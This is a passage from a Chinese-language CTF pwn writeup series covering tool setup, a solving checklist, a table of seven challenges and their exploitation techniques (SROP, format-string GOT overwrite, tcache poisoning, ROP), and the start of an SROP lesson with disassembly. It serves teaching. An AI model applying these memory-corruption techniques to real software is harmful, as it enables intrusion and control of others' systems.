都不裝也能完成全部 7 題。
\end{quote}

\paragraph{pwntools}\label{pwntools}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{rop }\OperatorTok{=}\NormalTok{ ROP(ELF(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{))}
\NormalTok{rop.find\_gadget([}\StringTok{\textquotesingle{}pop rdi\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}ret\textquotesingle{}}\NormalTok{])}
\NormalTok{rop.find\_gadget([}\StringTok{\textquotesingle{}syscall\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}ret\textquotesingle{}}\NormalTok{])}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※提示 \texttt{find\_\allowbreak{}gadget} 回傳的是一個 \textbf{\texttt{Gadget}
物件}（可以當 \texttt{int} 用，也可以 \texttt{.\allowbreak{}address}），
不是純整數；要拿去運算時寫 \texttt{int(gadget)} 最保險。
\end{quote}

\paragraph{one\_gadget（只對 libc
有用，本系列用不到）}\label{one_gadgetux53eaux5c0d-libc-ux6709ux7528ux672cux7cfbux5217ux7528ux4e0dux5230}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{gem}\NormalTok{ install one\_gadget        }\CommentTok{\# 用 Ruby 的 gem 裝（需先 sudo pacman {-}S ruby）}
\ExtensionTok{one\_gadget}\NormalTok{ ./libc.so.6}
\end{Highlighting}
\end{Shaded}

它會列出 libc 裡「執行到就會開 shell」的單一位址，
但通常有\textbf{條件限制}（某些暫存器必須是 0 或 NULL），要自己確認。

\begin{quote}
※注意 用 \texttt{gem} 裝的工具，執行檔會放在
\texttt{\$\allowbreak{}(gem\ \allowbreak{}env\ \allowbreak{}gemdir)/\allowbreak{}bin}， 那個目錄\textbf{預設不在
\texttt{PATH} 裡}。如果出現 \texttt{one\_\allowbreak{}gadget:\allowbreak{}\ \allowbreak{}command\ \allowbreak{}not\ \allowbreak{}found}，
先跑
\texttt{gem\ \allowbreak{}environment\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}grep\ \allowbreak{}-\allowbreak{}A1\ \allowbreak{}\textquotesingle{}\allowbreak{}EXECUTABLE\ \allowbreak{}DIRECTORY\textquotesingle{}\allowbreak{}}
找到路徑，把它加進 \texttt{PATH}。 本系列的 7 題\textbf{完全不需要
one-gadget}（我們都用明確的 \texttt{system@plt} / \texttt{syscall}），
所以裝不起來也不用擔心。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{15. 解題 SOP}\label{ux89e3ux984c-sop}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1. 看清楚題目
   - 有沒有附原始碼？有沒有 libc？有沒有 Dockerfile？
   - file <binary>              確認架構
   - python3 -c "from pwn import *; print(ELF('./<binary>', checksec=False).checksec())"
                                確認保護（不用等 checksec 這個指令裝好，見第 4 節）

2. 跑起來看看
   - ./binary                   玩一下介面
   - strings -n 6 <binary>      找提示字串（"flag", "sh", 指令表）

3. 反組譯
   - objdump -d -M intel <binary>  |  less
   - 或用 Ghidra / IDA / Binary Ninja 看 decompile
   - 找出 main、menu、所有 read/scanf/memcpy 呼叫

4. 找漏洞
   - 對照第 9 節的漏洞類型表
   - 用 gdb 確認 offset 與實際值（✶ 千萬不要用猜的）

5. 想利用策略
   - 需要 leak 嗎？（PIE / canary / libc base → 算式見 4.3.1）
   - 有 canary 嗎？（能不能繞過、能不能洩漏）
   - Full RELRO 嗎？（不能打 GOT → 改打返回位址或 hook）
   - 有 seccomp 嗎？（能不能 execve？）

6. 寫 exploit
   - 先讓本地能拿到 shell
   - 再改 REMOTE 參數打遠端
   - 遠端 libc 版本可能不同 → 附的 libc 優先使用
     （用 ./ld-linux-x86-64.so.2 --library-path . ./binary 或 patchelf）

7. 拿 flag
   - cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id
\end{Verbatim}

\paragraph{遠端 libc
不同的處理方式}\label{ux9060ux7aef-libc-ux4e0dux540cux7684ux8655ux7406ux65b9ux5f0f}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# 用題目附的 libc + ld 跑}
\ExtensionTok{./ld{-}linux{-}x86{-}64.so.2} \AttributeTok{{-}{-}library{-}path}\NormalTok{ . ./challenge}

\CommentTok{\# 或直接改 ELF（記得先備份）}
\ExtensionTok{patchelf} \AttributeTok{{-}{-}set{-}interpreter}\NormalTok{ ./ld{-}linux{-}x86{-}64.so.2 }\AttributeTok{{-}{-}set{-}rpath}\NormalTok{ . ./challenge}
\end{Highlighting}
\end{Shaded}

pwntools 裡：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{p }\OperatorTok{=}\NormalTok{ process([}\StringTok{\textquotesingle{}./ld{-}linux{-}x86{-}64.so.2\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}{-}{-}library{-}path\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}./challenge\textquotesingle{}}\NormalTok{])}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{附錄：本系列 7
題對照表}\label{ux9644ux9304ux672cux7cfbux5217-7-ux984cux5c0dux7167ux8868}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
題目
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
檔案
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
遠端 port
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
核心技巧
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
對應筆記
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
total\_recall & \texttt{pwn1/\allowbreak{}challenge} & 26003 & Stack Overflow →
\textbf{SROP} & \texttt{../\allowbreak{}pwn1/\allowbreak{}notes.\allowbreak{}md} \\
mad\_libs & \texttt{pwn2/\allowbreak{}mad\_\allowbreak{}libs} & 26001 & \textbf{Format String} →
\texttt{printf@got} 覆寫成 \texttt{system} &
\texttt{../\allowbreak{}pwn2/\allowbreak{}notes.\allowbreak{}md} \\
revolution & \texttt{pwn3/\allowbreak{}revolution} & 26002 & 自製 printf 的
\texttt{va\_\allowbreak{}list.\allowbreak{}overflow\_\allowbreak{}arg\_\allowbreak{}area} 指向輸入緩衝區 → \texttt{\%\allowbreak{}N\$\allowbreak{}s} /
\texttt{\%\allowbreak{}N\$\allowbreak{}w} 任意讀寫 → \texttt{strcspn@got} 覆寫成 \texttt{system} &
\texttt{../\allowbreak{}pwn3/\allowbreak{}notes.\allowbreak{}md} \\
cache\_money & \texttt{pwn4/\allowbreak{}cache\_\allowbreak{}money} & 26004 & \textbf{Heap}（UAF +
double free → tcache poisoning，繞過 safe-linking）→ \texttt{strtol@got}
覆寫成 \texttt{system} & \texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md} \\
homemaker & \texttt{pwn5/\allowbreak{}homemaker} & 26008 & PIE + canary + Full RELRO
→ off-by-one 改大容量 → 洩漏堆疊 → \textbf{ROP}（\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret}
+ \texttt{system@plt}，完全不需要 libc） & \texttt{../\allowbreak{}pwn5/\allowbreak{}notes.\allowbreak{}md} \\
code\_breaker & \texttt{pwn6/\allowbreak{}code\_\allowbreak{}breaker} & 26005 &
\textbf{Heap}（refcount 算錯 → double free + UAF → tcache poisoning）→
覆寫 \texttt{.\allowbreak{}bss} 函式指標 → \texttt{system()}（\textbf{不需要 ROP}） &
\texttt{../\allowbreak{}pwn6/\allowbreak{}notes.\allowbreak{}md} \\
SafeHouse & \texttt{pwn7/\allowbreak{}service} & 26007 & seccomp + stack pivot + 偽造
IPC + 負索引 & \texttt{../\allowbreak{}pwn7/\allowbreak{}notes.\allowbreak{}md} \\
\end{longtable}
}

\begin{quote}
※注意 \textbf{兩條「假線索」（題目提示故意放的餌，別被騙）}： *
\textbf{pwn5}：提示寫的「\textbf{命令注入}」是假的 ------ ECHO
指令執行的是寫死在 \texttt{.\allowbreak{}rodata:\allowbreak{}0x21b6} 的
\texttt{"/\allowbreak{}bin/\allowbreak{}echo\ \allowbreak{}-\allowbreak{}n\ \allowbreak{}\textquotesingle{}\allowbreak{}\textquotesingle{}\allowbreak{}"}（\texttt{objdump}
可證），全程沒有讀任何使用者輸入。 真正的手法就是上表寫的 off-by-one →
ROP。 * \textbf{pwn3}：提示寫的「\textbf{\texttt{.\allowbreak{}bss} 的 16-bit
長度整數溢位 + \texttt{memcpy}}」也是假的 ------
這支程式\textbf{根本沒有匯入 \texttt{memcpy}}（\texttt{readelf\ \allowbreak{}-\allowbreak{}s} 只有
write / strlen / strcspn / read / setvbuf）， 而 \texttt{0x4060} 也不在
\texttt{.\allowbreak{}bss}（\texttt{.\allowbreak{}bss} 是
\texttt{0x404040}--\texttt{0x404070}，\texttt{0x404060} 是 stderr 的
COPY relocation 欄位）。真正的漏洞是自製 printf 把
\texttt{va\_\allowbreak{}list.\allowbreak{}overflow\_\allowbreak{}arg\_\allowbreak{}area} 初始化成輸入緩衝區（見
\texttt{../\allowbreak{}pwn3/\allowbreak{}notes.\allowbreak{}md} §11-7）。

心得：\textbf{題目提示只能當方向，最後一定要用 \texttt{readelf} /
\texttt{objdump} / gdb 自己驗一次。}
\end{quote}

\begin{quote}
※檔案 \textbf{本系列的 flag 檔命名規則}（每題目錄下）： *
\texttt{FLAG.\allowbreak{}txt}：\textbf{遠端實打}得到的真
flag（例：\texttt{pwn1/\allowbreak{}FLAG.\allowbreak{}txt} =
\texttt{sun\{\allowbreak{}r3caLl\_\allowbreak{}ev3Ry\_\allowbreak{}reGist3r\_\allowbreak{}sR0p\}\allowbreak{}}） *
\texttt{FLAG\_\allowbreak{}REMOTE.\allowbreak{}txt}：同上，只有 pwn7 用這個名字（內容是真 flag） *
\texttt{flag.\allowbreak{}txt}：題目附件附的\textbf{假 flag}，放在題目目錄裡是為了讓
exploit 本地 \texttt{cat\ \allowbreak{}flag.\allowbreak{}txt}
測試時有東西可印（例：\texttt{sun\{\allowbreak{}LOCAL\_\allowbreak{}DUMMY\_\allowbreak{}FLAG\}\allowbreak{}} /
\texttt{SUNSHINE\{\allowbreak{}local\_\allowbreak{}test\_\allowbreak{}flag\}\allowbreak{}}）

另外每題都有一個 \texttt{notes.\allowbreak{}md} 寫解題過程，\texttt{wp/}
底下則是這份總教學、速查表與解題腳本。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\section{Part 2 --- pwn1
total\_recall（SROP）}\label{part-2-pwn1-total_recallsrop}

\begin{quote}
原始檔案：\texttt{pwn1/\allowbreak{}notes.\allowbreak{}md}
\end{quote}

\subsection{\texorpdfstring{pwn1 ---
\texttt{total\_\allowbreak{}recall}（技巧：SROP）}{pwn1 --- total\_recall（技巧：SROP）}}\label{pwn1-total_recallux6280ux5de7srop}

\begin{quote}
這一題是本份 writeup 的「教學主菜」。我假設你\textbf{完全沒學過 ROP /
SROP}， 也\textbf{沒寫過
exploit}。所以我會從暫存器、\texttt{call}/\texttt{ret}、堆疊開始講起，
一路講到 SROP 為什麼存在、怎麼用。

其他題目（pwn2 \textasciitilde{}
pwn7）會引用這裡建立的觀念，所以建議先讀完這篇。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{0.
先備知識：這題需要什麼？}\label{ux5148ux5099ux77e5ux8b58ux9019ux984cux9700ux8981ux4ec0ux9ebc}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
名詞
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
一句話解釋
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{checksec} & 一個工具，用來看一支執行檔開了哪些保護（canary / NX
/ PIE / RELRO） \\
pwntools & Python 的 CTF pwn 函式庫，\texttt{from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*}
之後就有
\texttt{process()}、\texttt{remote()}、\texttt{p64()}、\texttt{SigreturnFrame()}
等 \\
gdb & 除錯器，可以看執行到某一行時暫存器與記憶體的實際值 \\
syscall & 程式跟 Linux
核心要服務的方式（開檔、讀寫、執行新程式\ldots） \\
ROP & 用程式裡現成的 \texttt{ret}
結尾的小片段（gadget）串起來，做出原本程式沒有的行為 \\
SROP & ROP 的親戚。用 \texttt{rt\_\allowbreak{}sigreturn}
這個系統呼叫，一次把\textbf{所有暫存器}設成我們要的值 \\
\end{longtable}
}

\paragraph{環境指令}\label{ux74b0ux5883ux6307ux4ee4}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# 看保護}
\ExtensionTok{checksec} \AttributeTok{{-}{-}file}\OperatorTok{=}\NormalTok{./challenge}
\CommentTok{\# 或}
\ExtensionTok{python3} \AttributeTok{{-}c} \StringTok{"from pwn import *; print(ELF(\textquotesingle{}./challenge\textquotesingle{}, checksec=False).checksec())"}

\CommentTok{\# 反組譯（Intel 語法比較好讀）}
\ExtensionTok{objdump} \AttributeTok{{-}d} \AttributeTok{{-}M}\NormalTok{ intel challenge}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{1. 題目資訊}\label{ux984cux76eeux8cc7ux8a0a}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
檔案：challenge
ELF 64-bit LSB executable, x86-64, statically linked, stripped
\end{Verbatim}

\texttt{checksec} 的結果：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing   (實際上是 Stack: Executable)
PIE:        No PIE (0x400000)
Stack:      Executable
\end{Verbatim}

\begin{quote}
\texttt{NX:\allowbreak{}\ \allowbreak{}NX\ \allowbreak{}unknown\ \allowbreak{}-\allowbreak{}\ \allowbreak{}GNU\_\allowbreak{}STACK\ \allowbreak{}missing} 不是「沒有 NX
保護」的意思， 而是\textbf{這支 ELF 完全沒有 \texttt{GNU\_\allowbreak{}STACK} 這個
program header} （\texttt{readelf\ \allowbreak{}-\allowbreak{}l\ \allowbreak{}challenge} 只列出 2 個
\texttt{LOAD}，沒有 \texttt{GNU\_\allowbreak{}STACK}）。 依核心慣例，缺少
\texttt{GNU\_\allowbreak{}STACK} 就代表「\textbf{堆疊可執行}」， 所以 checksec
最後一行才會是 \texttt{Stack:\allowbreak{}\ \allowbreak{}Executable}。
\end{quote}

翻譯成人話：

\begin{itemize}
\tightlist
\item
  \textbf{No PIE} → 程式碼永遠載入在
  \texttt{0x400000}，所有函式位址都是固定的，不用洩漏就知道。
\item
  \textbf{No canary} → 堆疊溢位可以直接蓋返回位址，不會被偵測。
\item
  \textbf{NX 不存在 / Stack Executable} → 堆疊可以執行。
  （其實這題我們可以偷懶：直接寫 shellcode 到堆疊上再跳過去也行。
  但題目名稱 \texttt{total\_\allowbreak{}recall} + flag 是
  \texttt{sun\{\allowbreak{}r3caLl\_\allowbreak{}ev3Ry\_\allowbreak{}reGist3r\_\allowbreak{}sR0p\}\allowbreak{}} → 「recall every
  register」= \textbf{SROP 是官方預期解法}。我們照著做。）
\item
  \textbf{statically linked} → 沒有 libc 可以洩漏、沒有
  \texttt{system()}，全部靠自己下 syscall。
\item
  \textbf{stripped} → 沒有函式名稱，只能看反組譯。
\end{itemize}

程式只有 \textbf{108 bytes}（0x6c）的
\texttt{.\allowbreak{}text}，是純手工組合語言寫的。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{2. x86-64
最小知識包（沒學過請慢慢看）}\label{x86-64-ux6700ux5c0fux77e5ux8b58ux5305ux6c92ux5b78ux904eux8acbux6162ux6162ux770b}

\paragraph{2.1 暫存器}\label{ux66abux5b58ux5668-1}

64 位元模式下有 16 個通用暫存器，每個 8 bytes（64 bits）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rax  rbx  rcx  rdx  rsi  rdi  rbp  rsp  r8  r9  r10  r11  r12  r13  r14  r15
\end{Verbatim}

名字裡有歷史包袱，但現代 x86-64 只要記住\textbf{約定}（System V AMD64
ABI，Linux 用這套）：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
用途
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
暫存器
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
函式第 1\textasciitilde6 個整數參數 & \texttt{rdi}, \texttt{rsi},
\texttt{rdx}, \texttt{rcx}, \texttt{r8}, \texttt{r9} \\
第 7 個以後的參數 & 放堆疊上 \\
函式回傳值 & \texttt{rax} \\
\textbf{系統呼叫編號} & \texttt{rax} \\
系統呼叫的第 1\textasciitilde6 個參數 & \texttt{rdi}, \texttt{rsi},
\texttt{rdx}, \texttt{r10}, \texttt{r8}, \texttt{r9}（注意第 4 個是
\texttt{r10}，不是 \texttt{rcx}！） \\
系統呼叫回傳值 & \texttt{rax} \\
堆疊指標 & \texttt{rsp}（永遠指向堆疊最上面 = 最低位址） \\
框架指標 & \texttt{rbp}（函式的「基準點」，非強制） \\
指令指標 & \texttt{rip}（下一行要執行的位址，不能直接寫） \\
\end{longtable}
}

子暫存器命名：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rax = 64 bits
eax = 低 32 bits
 ax = 低 16 bits
 al = 低 8 bits     (ah = 次 8 bits)
\end{Verbatim}

\texttt{mov\ \allowbreak{}eax,\allowbreak{}\ \allowbreak{}1} 會把 \texttt{eax} 設成 1，\textbf{同時把
\texttt{rax} 的高 32 bits 清成 0}。 \texttt{mov\ \allowbreak{}al,\allowbreak{}\ \allowbreak{}1} 只動最低 8
bits。這在堆疊溢位長度控制上常常是關鍵（見 pwn7）。

\paragraph{2.2 堆疊}\label{ux5806ux758a}

堆疊是「由上往下長」的：位址高的在上面。

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
高位址
        ┌──────────────────┐
        │  ...             │
        ├──────────────────┤  ← rsp 目前在這
        │  剛剛 push 的值  │
        └──────────────────┘
低位址
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{push\ \allowbreak{}X}：先把 \texttt{rsp} 減 8，再把 X 寫到
  \texttt{{[}rsp{]}}。
\item
  \texttt{pop\ \allowbreak{}\ \allowbreak{}X}：把 \texttt{{[}rsp{]}} 讀進 X，再把 \texttt{rsp} 加
  8。
\item
  \texttt{call\ \allowbreak{}f}：＝ \texttt{push\ \allowbreak{}下一行的位址} 然後
  \texttt{jmp\ \allowbreak{}f}。
\item
  \texttt{ret}：＝ \texttt{pop\ \allowbreak{}rip} ------ 把 \texttt{{[}rsp{]}}
  當成下一個要執行的位址，\texttt{rsp\ \allowbreak{}+=\ \allowbreak{}8}。
\end{itemize}

\textbf{這就是為什麼「覆蓋返回位址」可以劫持控制流}：只要我們能寫超過區域變數緩衝區的範圍，
寫到 \texttt{{[}rsp{]}} 上那個返回位址，\texttt{ret}
就會跳到我們指定的地方。

\paragraph{2.3 Linux x86-64
系統呼叫}\label{linux-x86-64-ux7cfbux7d71ux547cux53eb}

呼叫方式固定是：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rax = 系統呼叫編號
rdi, rsi, rdx, r10, r8, r9 = 參數
syscall                     ; 執行（注意：是 `syscall` 指令，不是 `call`）
                            ; 回來之後 rax = 回傳值（負數代表 -errno）
\end{Verbatim}

本題用到的編號：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}llll@{}}
\toprule\noalign{}
編號 (十進位) & 名稱 & 參數 & 意義 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
0 & \texttt{read} & (fd, buf, count) & 從 fd 讀資料 \\
1 & \texttt{write} & (fd, buf, count) & 寫資料到 fd \\
15 & \texttt{rt\_\allowbreak{}sigreturn} & × & \textbf{SROP 的關鍵}，下面詳談 \\
59 & \texttt{execve} & (path, argv, envp) & 執行一支程式 \\
60 & \texttt{exit} & (code) & 結束 \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{3. 逐行組語解說（Intel
語法）}\label{ux9010ux884cux7d44ux8a9eux89e3ux8aaaintel-ux8a9eux6cd5}

完整反組譯只有這些：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{0000000000401000 \textless{}.text}\OperatorTok{\textgreater{}:}
\NormalTok{  401000:  e8 }\DecValTok{11} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{        call   }\BaseNTok{0x401016}     \CommentTok{; (A) 呼叫 leak 函式}
\NormalTok{  401005:  e8 }\DecValTok{45} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{        call   }\BaseNTok{0x40104f}     \CommentTok{; (B) 呼叫 vuln 函式  ← 有溢位}
\NormalTok{  40100a:  48 c7 c0 }\DecValTok{3}\ErrorTok{c} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x3c}     \CommentTok{; 60 = \_\_NR\_exit}
\NormalTok{  401011:  48 31 ff              }\OperatorTok{xor}    \KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rdi}      \CommentTok{; rdi = 0}
\NormalTok{  401014:  0f 05                 }\ControlFlowTok{syscall}               \CommentTok{; exit(0)}
\end{Highlighting}
\end{Shaded}

\texttt{0x401000} 是進入點（ELF 的
\texttt{e\_\allowbreak{}entry}）。注意這裡\textbf{沒有 libc 的 \texttt{\_\allowbreak{}start}}，
核心載入後直接跳到 \texttt{0x401000}。

\paragraph{\texorpdfstring{3.1 \texttt{0x401016} --- leak
函式}{3.1 0x401016 --- leak 函式}}\label{x401016-leak-ux51fdux5f0f}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  401016:  54                    }\BuiltInTok{push}   \KeywordTok{rsp}
\NormalTok{  401017:  48 89 e6              mov    }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{  40101a:  48 c7 c7 }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rdi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  401021:  48 c7 c2 }\DecValTok{08} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rdx}\OperatorTok{,}\BaseNTok{0x8}
\NormalTok{  401028:  48 c7 c0 }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  40102f:  0f 05                 }\ControlFlowTok{syscall}
\NormalTok{  401031:  58                    }\BuiltInTok{pop}    \KeywordTok{rax}
\NormalTok{  401032:  48 8d 74 24 c0        lea    }\KeywordTok{rsi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x40}\OperatorTok{]}
\NormalTok{  401037:  48 c7 c7 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rdi}\OperatorTok{,}\BaseNTok{0x0}
\NormalTok{  40103e:  48 c7 c2 }\DecValTok{18} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rdx}\OperatorTok{,}\BaseNTok{0x18}
\NormalTok{  401045:  48 c7 c0 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x0}
\NormalTok{  40104c:  0f 05                 }\ControlFlowTok{syscall}
\NormalTok{  40104e:  c3                    ret}
\end{Highlighting}
\end{Shaded}

一行一行解釋：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
位址
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
指令
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
中文說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{0x401016} & \texttt{push\ \allowbreak{}rsp} & 把「\textbf{push 之前}的
\texttt{rsp} 值」寫進堆疊。x86 的特性：\texttt{push\ \allowbreak{}rsp}
壓進去的是遞減前的舊值。 \\
\texttt{0x401017} & \texttt{mov\ \allowbreak{}rsi,\allowbreak{}rsp} & \texttt{rsi} = 目前
\texttt{rsp}，也就是「剛剛壓進去那個值的位址」。 \\
\texttt{0x40101a} & \texttt{mov\ \allowbreak{}rdi,\allowbreak{}1} & \texttt{write} 的第 1 個參數
fd = 1（stdout）。 \\
\texttt{0x401021} & \texttt{mov\ \allowbreak{}rdx,\allowbreak{}8} & 寫 8 bytes。 \\
\texttt{0x401028} & \texttt{mov\ \allowbreak{}rax,\allowbreak{}1} & 系統呼叫編號 1 =
\texttt{write}。 \\
\texttt{0x40102f} & \texttt{syscall} &
\textbf{\texttt{write(1,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}8)}} →
把堆疊位址送到我們眼前。這是「資訊洩漏」。 \\
\texttt{0x401031} & \texttt{pop\ \allowbreak{}rax} & \texttt{rax} =
剛剛洩漏的那個位址；\texttt{rsp} 加 8 還原。 \\
\texttt{0x401032} & \texttt{lea\ \allowbreak{}rsi,{[}rsp-\allowbreak{}0x40{]}} & \texttt{rsi} =
\texttt{rsp\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x40}。\texttt{lea}
是「算位址放進目的暫存器」，不做記憶體存取。 \\
\texttt{0x401037} & \texttt{mov\ \allowbreak{}rdi,\allowbreak{}0} & fd = 0（stdin）。 \\
\texttt{0x40103e} & \texttt{mov\ \allowbreak{}rdx,\allowbreak{}0x18} & 讀 24 bytes。 \\
\texttt{0x401045} & \texttt{mov\ \allowbreak{}rax,\allowbreak{}0} & 編號 0 = \texttt{read}。 \\
\texttt{0x40104c} & \texttt{syscall} &
\texttt{read(0,\allowbreak{}\ \allowbreak{}rsp-\allowbreak{}0x40,\allowbreak{}\ \allowbreak{}0x18)}。第一次輸入是在這裡被吃掉。 \\
\texttt{0x40104e} & \texttt{ret} & 返回 \texttt{0x401005}。 \\
\end{longtable}
}

\paragraph{\texorpdfstring{3.2 \texttt{0x40104f} --- vuln
函式（漏洞在這）}{3.2 0x40104f --- vuln 函式（漏洞在這）}}\label{x40104f-vuln-ux51fdux5f0fux6f0fux6d1eux5728ux9019}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  40104f:  48 8d 74 24 80        }\BuiltInTok{lea}    \KeywordTok{rsi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x80}\OperatorTok{]}
\NormalTok{  401054:  48 c7 c7 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rdi}\OperatorTok{,}\BaseNTok{0x0}
\NormalTok{  40105b:  48 c7 c2 }\DecValTok{00} \DecValTok{04} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rdx}\OperatorTok{,}\BaseNTok{0x400}
\NormalTok{  401062:  48 c7 c0 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov    }\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x0}
\NormalTok{  401069:  0f 05                 }\ControlFlowTok{syscall}
\NormalTok{  40106b:  c3                    ret}
\end{Highlighting}
\end{Shaded}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
